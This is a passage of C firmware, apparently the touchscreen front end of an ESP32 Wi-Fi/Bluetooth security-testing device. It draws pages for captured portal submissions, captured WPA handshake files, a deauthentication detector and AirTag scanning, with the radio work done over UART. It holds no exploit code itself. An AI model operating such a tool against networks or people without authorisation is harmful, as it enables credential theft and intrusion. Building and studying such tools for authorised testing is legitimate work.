                field[len] = '\0';
            }
            
            if (first_field) {
                size_t copy_len = strlen(field);
                if (copy_len >= sizeof(ssid)) copy_len = sizeof(ssid) - 1;
                memcpy(ssid, field, copy_len);
                ssid[copy_len] = '\0';
                first_field = false;
            } else {
                if (field_count > 0) {
                    strncat(fields, "\n", sizeof(fields) - strlen(fields) - 1);
                }
                strncat(fields, field, sizeof(fields) - strlen(fields) - 1);
                field_count++;
            }
            
            p = quote_end + 1;
        }
        
        if (strlen(ssid) > 0 && field_count > 0) {
            // Create entry row
            lv_obj_t *row = lv_obj_create(list_container);
            lv_obj_set_size(row, lv_pct(100), LV_SIZE_CONTENT);
            lv_obj_set_style_bg_color(row, lv_color_hex(0x2D2D2D), 0);
            lv_obj_set_style_border_width(row, 0, 0);
            lv_obj_set_style_radius(row, 6, 0);
            lv_obj_set_style_pad_all(row, 8, 0);
            lv_obj_set_flex_flow(row, LV_FLEX_FLOW_COLUMN);
            lv_obj_set_style_pad_row(row, 4, 0);
            lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
            
            lv_obj_t *ssid_lbl = lv_label_create(row);
            lv_label_set_text_fmt(ssid_lbl, "SSID: %s", ssid);
            lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_16, 0);
            lv_obj_set_style_text_color(ssid_lbl, lv_color_hex(0xFFFFFF), 0);
            
            lv_obj_t *fields_lbl = lv_label_create(row);
            lv_label_set_text(fields_lbl, fields);
            lv_obj_set_style_text_font(fields_lbl, &lv_font_montserrat_14, 0);
            lv_obj_set_style_text_color(fields_lbl, COLOR_MATERIAL_TEAL, 0);
            lv_obj_set_width(fields_lbl, lv_pct(100));
            lv_label_set_long_mode(fields_lbl, LV_LABEL_LONG_WRAP);
            
            entry_count++;
        }
        
        line = strtok(NULL, "\n\r");
    }
    
    lv_label_set_text_fmt(status_label, "Found %d submission(s)", entry_count);
}

//==================================================================================
// Handshakes Page
//==================================================================================

static void show_handshakes_page(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    hide_all_pages(ctx);
    
    // Delete and recreate to refresh data
    if (ctx->handshakes_page) {
        lv_obj_del(ctx->handshakes_page);
        ctx->handshakes_page = NULL;
    }
    
    // Create page
    ctx->handshakes_page = lv_obj_create(container);
    lv_coord_t scr_height = lv_disp_get_ver_res(NULL);
    lv_obj_set_size(ctx->handshakes_page, lv_pct(100), scr_height - 85);
    lv_obj_align(ctx->handshakes_page, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_set_style_bg_color(ctx->handshakes_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(ctx->handshakes_page, 0, 0);
    lv_obj_set_style_pad_all(ctx->handshakes_page, 10, 0);
    lv_obj_set_flex_flow(ctx->handshakes_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->handshakes_page, 8, 0);
    
    ctx->current_visible_page = ctx->handshakes_page;
    
    // Header
    lv_obj_t *header = lv_obj_create(ctx->handshakes_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 12, 0);
    
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, compromised_data_back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "Captured Handshakes");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_PURPLE, 0);
    
    // Status label
    lv_obj_t *status_label = lv_label_create(ctx->handshakes_page);
    lv_label_set_text(status_label, "Loading...");
    lv_obj_set_style_text_font(status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(status_label, lv_color_hex(0x888888), 0);
    
    // Scrollable list container
    lv_obj_t *list_container = lv_obj_create(ctx->handshakes_page);
    lv_obj_set_size(list_container, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(list_container, 1);
    lv_obj_set_style_bg_color(list_container, lv_color_hex(0x252525), 0);
    lv_obj_set_style_border_width(list_container, 0, 0);
    lv_obj_set_style_radius(list_container, 8, 0);
    lv_obj_set_style_pad_all(list_container, 10, 0);
    lv_obj_set_flex_flow(list_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(list_container, 8, 0);
    
    // Flush RX buffer to clear any boot messages from ESP32C5
    uart_port_t uart_port = uart_port_for_tab(current_tab);
    uart_flush_input(uart_port);
    
    // Send UART command and read response
    uart_send_command_for_tab("list_dir /sdcard/lab/handshakes");
    vTaskDelay(pdMS_TO_TICKS(1000));  // Wait for ESP32C5 to process and read from SD
    
    static char rx_buffer[4096];
    int total_len = 0;
    int retries = 10;
    int empty_reads = 0;
    
    while (retries-- > 0 && empty_reads < 3) {
        int len = transport_read_bytes(uart_port, rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(200));
        if (len > 0) {
            total_len += len;
            empty_reads = 0;  // Reset on successful read
        } else {
            empty_reads++;  // Only break after 3 consecutive empty reads
        }
    }
    rx_buffer[total_len] = '\0';
    
    ESP_LOGI(TAG, "Handshakes list response (%d bytes): %s", total_len, rx_buffer);
    
    // Parse response - look for lines ending with .pcap
    int entry_count = 0;
    char *line = strtok(rx_buffer, "\n\r");
    while (line != NULL) {
        // Look for .pcap files
        char *pcap_ext = strstr(line, ".pcap");
        if (pcap_ext != NULL && pcap_ext[5] == '\0') {  // Ensure .pcap is at end
            // Extract filename - skip leading number and space
            char *filename_start = line;
            
            // Skip leading digits and whitespace (e.g., "1 " or "12 ")
            while (*filename_start && (isdigit((unsigned char)*filename_start) || isspace((unsigned char)*filename_start))) {
                filename_start++;
            }
            
            // Calculate length without .pcap extension
            size_t name_len = pcap_ext - filename_start;
            
            if (name_len > 0 && name_len < 128) {
                char name[128] = {0};
                strncpy(name, filename_start, name_len);
                name[name_len] = '\0';
                
                // Create entry row
                lv_obj_t *row = lv_obj_create(list_container);
                lv_obj_set_size(row, lv_pct(100), LV_SIZE_CONTENT);
                lv_obj_set_style_bg_color(row, lv_color_hex(0x2D2D2D), 0);
                lv_obj_set_style_border_width(row, 0, 0);
                lv_obj_set_style_radius(row, 6, 0);
                lv_obj_set_style_pad_all(row, 10, 0);
                lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
                
                lv_obj_t *name_lbl = lv_label_create(row);
                lv_label_set_text(name_lbl, name);
                lv_obj_set_style_text_font(name_lbl, &lv_font_montserrat_16, 0);
                lv_obj_set_style_text_color(name_lbl, COLOR_MATERIAL_PURPLE, 0);
                lv_obj_set_width(name_lbl, lv_pct(100));
                lv_label_set_long_mode(name_lbl, LV_LABEL_LONG_WRAP);
                
                entry_count++;
            }
        }
        
        line = strtok(NULL, "\n\r");
    }
    
    lv_label_set_text_fmt(status_label, "Found %d handshake(s)", entry_count);
}

//==================================================================================
// Deauth Detector Page
//==================================================================================

// Update the deauth table UI with current entries
static void update_deauth_table(void)
{
    if (!deauth_table) return;
    
    // Save scroll position
    lv_coord_t scroll_y = lv_obj_get_scroll_y(deauth_table);
    
    lv_obj_clean(deauth_table);
    
    for (int i = 0; i < deauth_entry_count; i++) {
        deauth_entry_t *entry = &deauth_entries[i];
        
        lv_obj_t *row = lv_obj_create(deauth_table);
        lv_obj_set_size(row, lv_pct(100), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(row, lv_color_hex(0x2D2D2D), 0);
        lv_obj_set_style_border_width(row, 0, 0);
        lv_obj_set_style_radius(row, 6, 0);
        lv_obj_set_style_pad_all(row, 8, 0);
        lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
        lv_obj_set_flex_align(row, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
        
        // Channel
        lv_obj_t *ch_lbl = lv_label_create(row);
        lv_label_set_text_fmt(ch_lbl, "CH%d", entry->channel);
        lv_obj_set_style_text_font(ch_lbl, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(ch_lbl, COLOR_MATERIAL_AMBER, 0);
        lv_obj_set_width(ch_lbl, 50);
        
        // AP Name
        lv_obj_t *ap_lbl = lv_label_create(row);
        lv_label_set_text(ap_lbl, entry->ap_name);
        lv_obj_set_style_text_font(ap_lbl, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(ap_lbl, lv_color_hex(0xFFFFFF), 0);
        lv_obj_set_flex_grow(ap_lbl, 1);
        lv_label_set_long_mode(ap_lbl, LV_LABEL_LONG_DOT);
        
        // BSSID
        lv_obj_t *bssid_lbl = lv_label_create(row);
        lv_label_set_text(bssid_lbl, entry->bssid);
        lv_obj_set_style_text_font(bssid_lbl, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(bssid_lbl, lv_color_hex(0x888888), 0);
        lv_obj_set_width(bssid_lbl, 140);
        
        // RSSI
        lv_obj_t *rssi_lbl = lv_label_create(row);
        lv_label_set_text_fmt(rssi_lbl, "%d", entry->rssi);
        lv_obj_set_style_text_font(rssi_lbl, &lv_font_montserrat_14, 0);
        if (entry->rssi > -50) {
            lv_obj_set_style_text_color(rssi_lbl, COLOR_MATERIAL_GREEN, 0);
        } else if (entry->rssi > -70) {
            lv_obj_set_style_text_color(rssi_lbl, COLOR_MATERIAL_AMBER, 0);
        } else {
            lv_obj_set_style_text_color(rssi_lbl, COLOR_MATERIAL_RED, 0);
        }
        lv_obj_set_width(rssi_lbl, 45);
    }
    
    // Restore scroll position
    lv_obj_scroll_to_y(deauth_table, scroll_y, LV_ANIM_OFF);
}

// Parse deauth line and add to entries
// Format: [DEAUTH] CH: <channel> | AP: <ap_name> (<bssid>) | RSSI: <rssi>
static bool parse_deauth_line(const char *line, deauth_entry_t *entry)
{
    if (strstr(line, "[DEAUTH]") == NULL) return false;
    
    // Parse channel
    const char *ch_ptr = strstr(line, "CH:");
    if (!ch_ptr) return false;
    entry->channel = atoi(ch_ptr + 3);
    
    // Parse AP name - between "AP: " and " ("
    const char *ap_ptr = strstr(line, "AP:");
    if (!ap_ptr) return false;
    ap_ptr += 3;
    while (*ap_ptr == ' ') ap_ptr++;
    
    const char *paren = strchr(ap_ptr, '(');
    if (!paren) return false;
    
    size_t ap_len = paren - ap_ptr;
    while (ap_len > 0 && ap_ptr[ap_len - 1] == ' ') ap_len--;
    if (ap_len >= sizeof(entry->ap_name)) ap_len = sizeof(entry->ap_name) - 1;
    memcpy(entry->ap_name, ap_ptr, ap_len);
    entry->ap_name[ap_len] = '\0';
    
    // Parse BSSID - between "(" and ")"
    paren++;
    const char *paren_end = strchr(paren, ')');
    if (!paren_end) return false;
    
    size_t bssid_len = paren_end - paren;
    if (bssid_len >= sizeof(entry->bssid)) bssid_len = sizeof(entry->bssid) - 1;
    memcpy(entry->bssid, paren, bssid_len);
    entry->bssid[bssid_len] = '\0';
    
    // Parse RSSI
    const char *rssi_ptr = strstr(line, "RSSI:");
    if (!rssi_ptr) return false;
    entry->rssi = atoi(rssi_ptr + 5);
    
    return true;
}

// Deauth detector monitor task
static void deauth_detector_task(void *arg)
{
    // Get context passed to task
    tab_context_t *ctx = (tab_context_t *)arg;
    
    // Determine UART from context
    tab_id_t task_tab = tab_id_for_ctx(ctx);
    uart_port_t uart_port = (task_tab == TAB_MBUS && uart2_initialized) ? UART2_NUM : UART_NUM;
    const char *uart_name = tab_transport_name(task_tab);
    
    ESP_LOGI(TAG, "[%s] Deauth detector task started for tab %d", uart_name, task_tab);
    
    static char rx_buffer[512];
    static char line_buffer[256];
    int line_pos = 0;
    
    // Use context's flag
    while (ctx && ctx->deauth_detector_running) {
        int len = transport_read_bytes(uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        
                        deauth_entry_t entry;
                        if (parse_deauth_line(line_buffer, &entry)) {
                            ESP_LOGI(TAG, "Deauth detected: CH%d %s (%s) RSSI=%d", 
                                     entry.channel, entry.ap_name, entry.bssid, entry.rssi);
                            
                            // Shift entries down (newest first)
                            if (deauth_entry_count < DEAUTH_DETECTOR_MAX_ENTRIES) {
                                deauth_entry_count++;
                            }
                            memmove(&deauth_entries[1], &deauth_entries[0], 
                                    (deauth_entry_count - 1) * sizeof(deauth_entry_t));
                            deauth_entries[0] = entry;
                            
                            // Update UI
                            bsp_display_lock(0);
                            update_deauth_table();
                            bsp_display_unlock();
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < (int)sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    ESP_LOGI(TAG, "Deauth detector task ended");
    deauth_detector_task_handle = NULL;
    vTaskDelete(NULL);
}

// Start button callback
static void deauth_detector_start_cb(lv_event_t *e)
{
    (void)e;
    if (deauth_detector_running) return;
    
    ESP_LOGI(TAG, "Starting deauth detector");
    uart_send_command_for_tab("deauth_detector");
    
    deauth_detector_running = true;
    
    // Also mark in context
    tab_context_t *ctx = get_current_ctx();
    if (ctx) {
        ctx->deauth_detector_running = true;
    }
    
    xTaskCreate(deauth_detector_task, "deauth_det", 4096, (void*)ctx, 5, &deauth_detector_task_handle);
    
    // Update button states
    lv_obj_add_state(deauth_start_btn, LV_STATE_DISABLED);
    lv_obj_clear_state(deauth_stop_btn, LV_STATE_DISABLED);
}

// Stop button callback
static void deauth_detector_stop_cb(lv_event_t *e)
{
    (void)e;
    if (!deauth_detector_running) return;
    
    ESP_LOGI(TAG, "Stopping deauth detector");
    uart_send_command_for_tab("stop");
    
    deauth_detector_running = false;
    
    // Also clear in context
    tab_context_t *stop_ctx = get_current_ctx();
    if (stop_ctx) {
        stop_ctx->deauth_detector_running = false;
    }
    
    if (deauth_detector_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(100));
        deauth_detector_task_handle = NULL;
    }
    
    // Update button states
    lv_obj_clear_state(deauth_start_btn, LV_STATE_DISABLED);
    lv_obj_add_state(deauth_stop_btn, LV_STATE_DISABLED);
}

// Back button callback - hide page and show tiles
static void deauth_detector_back_btn_event_cb(lv_event_t *e)
{
    (void)e;
    
    // Stop detector if running
    if (deauth_detector_running) {
        uart_send_command_for_tab("stop");
        deauth_detector_running = false;
        
        // Also clear in context
        tab_context_t *back_ctx = get_current_ctx();
        if (back_ctx) {
            back_ctx->deauth_detector_running = false;
        }
        
        if (deauth_detector_task_handle != NULL) {
            vTaskDelay(pdMS_TO_TICKS(100));
            deauth_detector_task_handle = NULL;
        }
    }
    
    tab_context_t *ctx = get_current_ctx();
    
    // Hide deauth detector page
    if (ctx->deauth_detector_page) {
        lv_obj_add_flag(ctx->deauth_detector_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Show tiles
    if (ctx->tiles) {
        lv_obj_clear_flag(ctx->tiles, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->tiles;
    }
}

// Show Deauth Detector page (inside current tab's container)
static void show_deauth_detector_page(void)
{
    tab_context_t *ctx = get_current_ctx();
    lv_obj_t *container = get_current_tab_container();
    
    if (!container) {
        ESP_LOGE(TAG, "Container not initialized for tab %d", current_tab);
        return;
    }
    
    // Hide all other pages
    hide_all_pages(ctx);
    
    // If page already exists, just show it
    if (ctx->deauth_detector_page) {
        lv_obj_clear_flag(ctx->deauth_detector_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->deauth_detector_page;
        deauth_detector_page = ctx->deauth_detector_page;
        ESP_LOGI(TAG, "Showing existing deauth detector page for tab %d", current_tab);
        return;
    }
    
    ESP_LOGI(TAG, "Creating new deauth detector page for tab %d", current_tab);
    
    // Create page container inside tab container
    ctx->deauth_detector_page = lv_obj_create(container);
    deauth_detector_page = ctx->deauth_detector_page;
    lv_obj_set_size(deauth_detector_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(deauth_detector_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(deauth_detector_page, 0, 0);
    lv_obj_set_style_pad_all(deauth_detector_page, 10, 0);
    lv_obj_set_flex_flow(deauth_detector_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(deauth_detector_page, 8, 0);
    
    // Header with back button, title, and start/stop buttons
    lv_obj_t *header = lv_obj_create(deauth_detector_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 10, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    // Left side: Back + Title
    lv_obj_t *left_cont = lv_obj_create(header);
    lv_obj_set_size(left_cont, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(left_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(left_cont, 0, 0);
    lv_obj_set_style_pad_all(left_cont, 0, 0);
    lv_obj_set_flex_flow(left_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(left_cont, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(left_cont, 10, 0);
    lv_obj_clear_flag(left_cont, LV_OBJ_FLAG_SCROLLABLE);
    
    // Back button (arrow style)
    lv_obj_t *back_btn = lv_btn_create(left_cont);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, deauth_detector_back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    // Title
    lv_obj_t *title = lv_label_create(left_cont);
    lv_label_set_text(title, "Deauth Detector");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_AMBER, 0);
    
    // Right side: Start/Stop buttons
    lv_obj_t *btn_cont = lv_obj_create(header);
    lv_obj_set_size(btn_cont, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(btn_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_cont, 0, 0);
    lv_obj_set_style_pad_all(btn_cont, 0, 0);
    lv_obj_set_flex_flow(btn_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_column(btn_cont, 10, 0);
    lv_obj_clear_flag(btn_cont, LV_OBJ_FLAG_SCROLLABLE);
    
    // Start button
    deauth_start_btn = lv_btn_create(btn_cont);
    lv_obj_set_size(deauth_start_btn, 90, 40);
    lv_obj_set_style_bg_color(deauth_start_btn, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_bg_color(deauth_start_btn, lv_color_hex(0x555555), LV_STATE_DISABLED);
    lv_obj_set_style_radius(deauth_start_btn, 8, 0);
    lv_obj_add_event_cb(deauth_start_btn, deauth_detector_start_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *start_label = lv_label_create(deauth_start_btn);
    lv_label_set_text(start_label, LV_SYMBOL_PLAY " Start");
    lv_obj_set_style_text_font(start_label, &lv_font_montserrat_14, 0);
    lv_obj_center(start_label);
    
    // Stop button
    deauth_stop_btn = lv_btn_create(btn_cont);
    lv_obj_set_size(deauth_stop_btn, 90, 40);
    lv_obj_set_style_bg_color(deauth_stop_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_bg_color(deauth_stop_btn, lv_color_hex(0x555555), LV_STATE_DISABLED);
    lv_obj_set_style_radius(deauth_stop_btn, 8, 0);
    lv_obj_add_event_cb(deauth_stop_btn, deauth_detector_stop_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_add_state(deauth_stop_btn, LV_STATE_DISABLED);  // Initially disabled
    
    lv_obj_t *stop_label = lv_label_create(deauth_stop_btn);
    lv_label_set_text(stop_label, LV_SYMBOL_STOP " Stop");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_14, 0);
    lv_obj_center(stop_label);
    
    // Status/count label
    lv_obj_t *count_label = lv_label_create(deauth_detector_page);
    lv_label_set_text_fmt(count_label, "Detected: %d deauth events", deauth_entry_count);
    lv_obj_set_style_text_font(count_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(count_label, lv_color_hex(0x888888), 0);
    
    // Scrollable table container
    deauth_table = lv_obj_create(deauth_detector_page);
    lv_obj_set_size(deauth_table, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(deauth_table, 1);
    lv_obj_set_style_bg_color(deauth_table, lv_color_hex(0x252525), 0);
    lv_obj_set_style_border_width(deauth_table, 0, 0);
    lv_obj_set_style_radius(deauth_table, 8, 0);
    lv_obj_set_style_pad_all(deauth_table, 8, 0);
    lv_obj_set_flex_flow(deauth_table, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(deauth_table, 6, 0);
    
    // Populate table with existing entries (if any from previous session)
    update_deauth_table();
    
    // Set current visible page
    ctx->current_visible_page = ctx->deauth_detector_page;
}

//==================================================================================
// Bluetooth Menu
//==================================================================================

// Back button for BT menu -> hide page and show tiles
static void bt_menu_back_btn_event_cb(lv_event_t *e)
{
    (void)e;
    tab_context_t *ctx = get_current_ctx();
    
    // Hide BT menu page
    if (ctx->bt_menu_page) {
        lv_obj_add_flag(ctx->bt_menu_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Show tiles
    if (ctx->tiles) {
        lv_obj_clear_flag(ctx->tiles, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->tiles;
    }
}

// Tile click handler for BT menu sub-tiles
static void bt_menu_tile_event_cb(lv_event_t *e)
{
    const char *tile_name = (const char *)lv_event_get_user_data(e);
    ESP_LOGI(TAG, "BT menu tile clicked: %s", tile_name);
    
    if (strcmp(tile_name, "AirTag Scan") == 0) {
        show_airtag_scan_page();
    } else if (strcmp(tile_name, "BT Scan & Locate") == 0) {
        show_bt_scan_page();
    }
}

// Show Bluetooth menu page with 3 tiles (inside current tab's container)
static void show_bluetooth_menu_page(void)
{
    tab_context_t *ctx = get_current_ctx();
    lv_obj_t *container = get_current_tab_container();
    
    if (!container) {
        ESP_LOGE(TAG, "Container not initialized for tab %d", current_tab);
        return;
    }
    
    // Hide all other pages
    hide_all_pages(ctx);
    
    // If page already exists, just show it
    if (ctx->bt_menu_page) {
        lv_obj_clear_flag(ctx->bt_menu_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->bt_menu_page;
        bt_menu_page = ctx->bt_menu_page;
        ESP_LOGI(TAG, "Showing existing BT menu page for tab %d", current_tab);
        return;
    }
    
    ESP_LOGI(TAG, "Creating new BT menu page for tab %d", current_tab);
    
    // Create page container inside tab container
    ctx->bt_menu_page = lv_obj_create(container);
    bt_menu_page = ctx->bt_menu_page;
    lv_obj_set_size(bt_menu_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(bt_menu_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(bt_menu_page, 0, 0);
    lv_obj_set_style_pad_all(bt_menu_page, 10, 0);
    lv_obj_set_flex_flow(bt_menu_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(bt_menu_page, 10, 0);
    
    // Header
    lv_obj_t *header = lv_obj_create(bt_menu_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 12, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, bt_menu_back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "Bluetooth");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_CYAN, 0);
    
    // Tiles container - vertical column, centered
    lv_obj_t *tiles = lv_obj_create(bt_menu_page);
    lv_obj_set_size(tiles, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(tiles, 1);
    lv_obj_set_style_bg_opa(tiles, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(tiles, 15, 0);
    lv_obj_clear_flag(tiles, LV_OBJ_FLAG_SCROLLABLE);
    
    create_tile(tiles, LV_SYMBOL_GPS, "AirTag\nScan", COLOR_MATERIAL_AMBER, bt_menu_tile_event_cb, "AirTag Scan");
    create_tile(tiles, LV_SYMBOL_BLUETOOTH, "BT Scan\n& Locate", COLOR_MATERIAL_CYAN, bt_menu_tile_event_cb, "BT Scan & Locate");
    
    // Set current visible page
    ctx->current_visible_page = ctx->bt_menu_page;
}

//==================================================================================
// AirTag Scan Page
//==================================================================================

// Back to BT menu from AirTag page - hide page and show BT menu
static void airtag_scan_back_btn_event_cb(lv_event_t *e)
{
    (void)e;
    
    // Stop scanning
    if (airtag_scanning) {
        uart_send_command_for_tab("stop");
        airtag_scanning = false;
        if (airtag_scan_task_handle != NULL) {
            vTaskDelay(pdMS_TO_TICKS(100));
            airtag_scan_task_handle = NULL;
        }
    }
    
    tab_context_t *ctx = get_current_ctx();
    
    // Hide AirTag page
    if (ctx->bt_airtag_page) {
        lv_obj_add_flag(ctx->bt_airtag_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Show BT menu
    if (ctx->bt_menu_page) {
        lv_obj_clear_flag(ctx->bt_menu_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->bt_menu_page;
    }
}

static void airtag_scan_task(void *arg)
{
    // Get context passed to task
    tab_context_t *ctx = (tab_context_t *)arg;
    
    // Determine UART from context
    tab_id_t task_tab = tab_id_for_ctx(ctx);
    uart_port_t uart_port = (task_tab == TAB_MBUS && uart2_initialized) ? UART2_NUM : UART_NUM;
    const char *uart_name = tab_transport_name(task_tab);
    
    ESP_LOGI(TAG, "[%s] AirTag scan task started for tab %d", uart_name, task_tab);
    
    static char rx_buffer[256];
    static char line_buffer[64];
    int line_pos = 0;
    
    // Use context's flag
    while (ctx && ctx->airtag_scanning) {
        int len = transport_read_bytes(uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        
                        // Parse format: airtag_count,smarttag_count
